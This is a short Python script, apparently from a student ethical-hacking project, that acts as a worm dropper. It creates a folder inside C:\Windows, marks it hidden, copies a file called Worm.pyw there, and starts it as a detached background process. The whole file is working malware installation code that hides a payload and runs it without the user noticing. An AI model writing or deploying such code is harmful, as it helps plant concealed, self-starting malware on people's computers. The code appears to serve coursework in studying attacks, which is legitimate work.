import shutil
import os
import subprocess

hiddenFolderPath = os.path.expanduser("C:\\Windows\\s142486_WormFolder")
sourceFile = os.path.expanduser("C:\\Users\\rvm85\\OneDrive - AP Hogeschool Antwerpen\\Documenten\\AP school\\3itcsc1\\Ethical hacking\\ProjectFolder\\Product\\Worm.pyw")
wormPath = os.path.expanduser(f"{hiddenFolderPath}\\Worm.pyw")

if not os.path.exists(hiddenFolderPath):
    os.makedirs(hiddenFolderPath)
os.system(f'attrib +h "{hiddenFolderPath}"')

# # Copy the worm to nest it within the system
shutil.copy(sourceFile, hiddenFolderPath)

# Run the worm in the system
with open(wormPath) as file:
    subprocess.Popen(['pyw', wormPath], creationflags=subprocess.DETACHED_PROCESS, env=os.environ.copy())